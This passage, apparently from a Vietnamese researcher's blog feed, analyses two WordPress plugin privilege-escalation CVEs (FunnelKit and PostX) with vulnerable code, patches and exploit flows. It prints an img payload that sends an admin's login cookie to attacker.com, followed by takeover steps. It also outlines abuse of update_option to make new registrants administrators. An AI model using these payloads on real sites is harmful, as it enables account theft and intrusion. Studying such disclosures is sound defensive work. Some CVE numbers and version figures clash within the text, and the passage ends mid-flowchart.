kho·∫£n &lt;strong&gt;Contributor&lt;/strong&gt; v√† t·∫°o m·ªôt b√†i vi·∫øt m·ªõi v·ªõi n·ªôi dung:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;#34;http://attacker.com/[wf_get_cookie key=wordpress_logged_in_md5(your_site_url)]&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Khi qu·∫£n tr·ªã vi√™n truy c·∫≠p b√†i vi·∫øt n√†y, tr√¨nh duy·ªát s·∫Ω g·ª≠i request t·ªõi &lt;code&gt;attacker.com&lt;/code&gt;, k√®m theo gi√° tr·ªã cookie ƒë∆∞·ª£c render trong URL. Attacker thu th·∫≠p cookie t·ª´ request ƒë√≥.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/get_cookie.png&#34; title=&#34;Cookie t·ª´ request&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/get_cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie t·ª´ request&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/get_cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;148&#34; width=&#34;1509&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie t·ª´ request&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Attacker truy c·∫≠p endpoint &lt;code&gt;/my-account/edit-account/&lt;/code&gt; v√† thay th·∫ø cookie &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; c·ªßa m√¨nh b·∫±ng cookie c·ªßa admin v·ª´a thu ƒë∆∞·ª£c.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Th·ª±c hi·ªán thay ƒë·ªïi email t√†i kho·∫£n sang ƒë·ªãa ch·ªâ email do attacker ki·ªÉm so√°t.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng ch·ª©c nƒÉng &lt;strong&gt;forgot password&lt;/strong&gt; ƒë·ªÉ ƒë·∫∑t m·∫≠t kh·∫©u m·ªõi.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;ƒêƒÉng nh·∫≠p l·∫°i h·ªá th·ªëng v·ªõi quy·ªÅn &lt;strong&gt;admin&lt;/strong&gt; b·∫±ng m·∫≠t kh·∫©u v·ª´a t·∫°o.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-7654 xu·∫•t ph√°t t·ª´ shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; cho ph√©p ƒë·ªçc cookie x√°c th·ª±c m√† kh√¥ng ki·ªÉm so√°t quy·ªÅn, d·∫´n ƒë·∫øn r√≤ r·ªâ &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; v√† m·ªü ƒë∆∞·ªùng cho leo thang ƒë·∫∑c quy·ªÅn. Vi·ªác k·∫øt h·ª£p shortcode v·ªõi HTML attribute bi·∫øn h√†nh vi hi·ªÉn th·ªã d·ªØ li·ªáu th√†nh k√™nh exfiltration. B·∫£n v√° v3.12.0 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch ch·∫∑n c√°c cookie nh·∫°y c·∫£m theo pattern.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Shortcode ƒë·ªçc cookie l√† thi·∫øt k·∫ø nguy hi·ªÉm.&lt;/li&gt;&#xA;&lt;li&gt;HTML attribute injection c√≥ th·ªÉ d·∫´n ƒë·∫øn r√≤ r·ªâ d·ªØ li·ªáu x√°c th·ª±c.&lt;/li&gt;&#xA;&lt;li&gt;Contributor v·∫´n c√≥ th·ªÉ tr·ªü th√†nh vector leo thang ƒë·∫∑c quy·ªÅn.&lt;/li&gt;&#xA;&lt;li&gt;Cookie &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; ƒë·ªß ƒë·ªÉ chi·∫øm quy·ªÅn gi√°n ti·∫øp.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n x√°c minh th·ª±c t·∫ø b·∫£n v√° trong m√£ ngu·ªìn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/funnel-builder/vulnerability/wordpress-funnelkit-plugin-3-11-0-2-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Funnel Builder by FunnelKit Plugin &amp;lt;= 3.11.0.2 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53425 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-05-cve-2025-55707/</link>
      <pubDate>Mon, 05 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-05-cve-2025-55707/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-05-cve-2025-55707/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;G√°n Quy·ªÅn Kh√¥ng Ch√≠nh X√°c&lt;/strong&gt; (&lt;strong&gt;Incorrect Privilege Assignment&lt;/strong&gt;) trong &lt;strong&gt;PostX, Inc. PostX PostX-lite&lt;/strong&gt; cho ph√©p &lt;strong&gt;Leo Thang ƒê·∫∑c Quy·ªÅn&lt;/strong&gt; (&lt;strong&gt;Privilege Escalation&lt;/strong&gt;). V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;PostX&lt;/strong&gt; t·ª´ &lt;strong&gt;n/a&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;&amp;lt;= 4.1.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53425&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53425&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.35&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.36&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Editor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ultimate-post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PostX Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;PostX&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.35&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.36&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    &amp;#39;ultp/v1&amp;#39;,&#xA;    &amp;#39;/postx_presets/&amp;#39;,&#xA;    array(&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;  =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39; =&amp;gt; array($this, &amp;#39;postx_presets_callback&amp;#39;),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                return current_user_can(&amp;#39;edit_posts&amp;#39;);&#xA;            },&#xA;            &amp;#39;args&amp;#39; =&amp;gt; array()&#xA;        )&#xA;    )&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi c·∫•u h√¨nh tr√™n, API ƒë∆∞·ª£c expose d∆∞·ªõi d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi c√≥ request g·ª≠i ƒë·∫øn endpoint n√†y v·ªõi method POST, WordPress s·∫Ω g·ªçi &lt;code&gt;postx_presets_callback()&lt;/code&gt;. Tuy nhi√™n, tr∆∞·ªõc khi h√†m n√†y ƒë∆∞·ª£c th·ª±c thi, request b·∫Øt bu·ªôc ph·∫£i v∆∞·ª£t qua b∆∞·ªõc ki·ªÉm tra quy·ªÅn th√¥ng qua &lt;code&gt;current_user_can(&#39;edit_posts&#39;)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Quy·ªÅn &lt;code&gt;edit_posts&lt;/code&gt; ƒë∆∞·ª£c c·∫•p cho ng∆∞·ªùi d√πng c√≥ role &lt;strong&gt;Contributor&lt;/strong&gt; tr·ªü l√™n. Trong khi ƒë√≥, l·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë l·∫°i y√™u c·∫ßu quy·ªÅn &lt;strong&gt;Editor&lt;/strong&gt;. Do s·ª± kh√°c bi·ªát n√†y, c·∫ßn ti·∫øp t·ª•c ph√¢n t√≠ch n·ªôi dung c·ªßa h√†m &lt;code&gt;postx_presets_callback()&lt;/code&gt; ƒë·ªÉ x√°c ƒë·ªãnh nguy√™n nh√¢n v√† c√°ch l·ªó h·ªïng c√≥ th·ªÉ b·ªã khai th√°c.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function postx_presets_callback($server) {&#xA;    $post = $server-&amp;gt;get_params();&#xA;    $type = isset($post[&amp;#39;type&amp;#39;]) ? $post[&amp;#39;type&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $key = isset($post[&amp;#39;key&amp;#39;]) ? $post[&amp;#39;key&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $data = isset($post[&amp;#39;data&amp;#39;]) ? $post[&amp;#39;data&amp;#39;] : &amp;#39;&amp;#39;;&#xA;&#xA;    if ( $type ) {&#xA;        if ( $type == &amp;#39;set&amp;#39; ) {&#xA;            if ( current_user_can(&amp;#39;edit_others_posts&amp;#39;) ) {&#xA;                update_option($key, $data);&#xA;            }&#xA;            return [&amp;#39;success&amp;#39; =&amp;gt; true];&#xA;        } else {&#xA;            return [&amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;data&amp;#39; =&amp;gt; get_option($key, [])];&#xA;        }&#xA;    } else {&#xA;        return [&amp;#39;success&amp;#39; =&amp;gt; false];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m callback l·∫•y c√°c tham s·ªë &lt;code&gt;type&lt;/code&gt;, &lt;code&gt;key&lt;/code&gt; v√† &lt;code&gt;data&lt;/code&gt; t·ª´ request. Khi &lt;code&gt;type&lt;/code&gt; b·∫±ng &lt;code&gt;&#39;set&#39;&lt;/code&gt;, h√†m s·∫Ω g·ªçi &lt;code&gt;update_option()&lt;/code&gt; ƒë·ªÉ c·∫≠p nh·∫≠t option t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;$key&lt;/code&gt;, v·ªõi ƒëi·ªÅu ki·ªán ng∆∞·ªùi d√πng c√≥ quy·ªÅn &lt;code&gt;edit_others_posts&lt;/code&gt; (ch·ªâ d√†nh cho role &lt;strong&gt;Editor&lt;/strong&gt; tr·ªü l√™n). Trong c√°c tr∆∞·ªùng h·ª£p c√≤n l·∫°i, h√†m tr·∫£ v·ªÅ gi√° tr·ªã c·ªßa option th√¥ng qua &lt;code&gt;get_option()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Nh∆∞ v·∫≠y, c√≥ th·ªÉ th·∫•y r√µ l√Ω do l·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë v·ªõi y√™u c·∫ßu quy·ªÅn &lt;strong&gt;Editor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;M·ªôt k·ªãch b·∫£n ph·ªï bi·∫øn ƒë·ªÉ khai th√°c l·ªó h·ªïng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; th√¥ng qua h√†m &lt;code&gt;update_option()&lt;/code&gt; l√†:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;ƒê·∫∑t &lt;code&gt;users_can_register = 1&lt;/code&gt; ƒë·ªÉ cho ph√©p ng∆∞·ªùi d√πng t·ª± ƒëƒÉng k√Ω&lt;/li&gt;&#xA;&lt;li&gt;ƒê·∫∑t &lt;code&gt;default_role = administrator&lt;/code&gt; ƒë·ªÉ c√°c t√†i kho·∫£n m·ªõi ƒë∆∞·ª£c t·∫°o c√≥ quy·ªÅn Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhi√™n, do ƒë√¢y l√† m·ªôt REST API s·ª≠ d·ª•ng ph∆∞∆°ng th·ª©c &lt;strong&gt;POST&lt;/strong&gt;, n√™n khi ƒë∆∞·ª£c g·ªçi t·ª´ tr√¨nh duy·ªát, request b·∫Øt bu·ªôc ph·∫£i k√®m theo nonce. V·ªõi c√°c REST request c√≥ kh·∫£ nƒÉng thay ƒë·ªïi d·ªØ li·ªáu (POST / PUT / DELETE), WordPress y√™u c·∫ßu nonce ƒë·ªÉ ch·ªëng t·∫•n c√¥ng CSRF. N·∫øu request kh√¥ng c√≥ nonce, WordPress s·∫Ω t·ª´ ch·ªëi v·ªõi l·ªói &lt;code&gt;rest_forbidden&lt;/code&gt;; n·∫øu nonce kh√¥ng h·ª£p l·ªá, request s·∫Ω b·ªã ch·∫∑n v·ªõi l·ªói &lt;code&gt;rest_cookie_invalid_nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ l·∫•y ƒë∆∞·ª£c REST API nonce, ta c·∫ßn ƒëƒÉng nh·∫≠p v√†o Admin Dashboard v√† g·ªçi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; trong &lt;strong&gt;browser console&lt;/strong&gt; khi t·∫°o post, v√¨ nonce n√†y ch·ªâ ƒë∆∞·ª£c WordPress inject v√†o trang khi ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p h·ª£p l·ªá. ƒê√¢y l√† tr∆∞·ªùng h·ª£p ƒë·∫∑c bi·ªát, n√≥ ƒë∆∞·ª£c inject v√†o trang khi t·∫°o post.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;strong&gt;v4.1.36&lt;/strong&gt; ƒë√£ si·∫øt ch·∫∑t ki·ªÉm so√°t quy·ªÅn b·∫±ng c√°ch thay ƒë·ªïi &lt;code&gt;permission_callback&lt;/code&gt; nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;    return current_user_can(&amp;#39;manage_options&amp;#39;); // Admins only&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi thay ƒë·ªïi n√†y, ch·ªâ ng∆∞·ªùi d√πng c√≥ quy·ªÅn &lt;code&gt;manage_options&lt;/code&gt; (role &lt;strong&gt;Administrator&lt;/strong&gt;) m·ªõi c√≥ th·ªÉ truy c·∫≠p endpoint, qua ƒë√≥ ngƒÉn ch·∫∑n kh·∫£ nƒÉng khai th√°c l·ªó h·ªïng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; t·ª´ c√°c role th·∫•p h∆°n.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Editor (Authenticated User)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access Admin / Create Post Page&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WordPress injects wpApiSettings.nonce&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Editor obtains REST API nonce&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;POST /wp-json/ultp/v1/postx_presets/&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;X-WP-Nonce validation&amp;#34;]&#xA;&#xA;F -- Invalid --&amp;gt; G[&amp;#34;Request rejected&amp;#34;]&#xA;F -- Valid --&amp;gt; H[&amp;#34;permission_callback: current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;&#xA;H -- No --&amp;gt; I[&amp;#34;Access denied&amp;#34;]&#xA;H -- Yes --&amp;gt; J[&amp;#34;postx_presets_callback()&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;type == &amp;#39;set&amp;#39;?&amp;#34;}&#xA;K -- No --&amp;gt; L[&amp;#34;get_option()&amp;#34;]&#xA;K -- Yes --&amp;gt; M{&amp;#34;current_user_can(&amp;#39;edit_others_posts&amp;#39;)?&amp;#34;}&#xA;&#xA;M -- No --&amp;gt; N[&amp;#34;Return success without update&amp;#34;]&#xA;M -- Yes --&amp;gt; O[&amp;#34;update_option(key, data)&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Modify sensitive wp_options&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Privilege escalation via default_role / 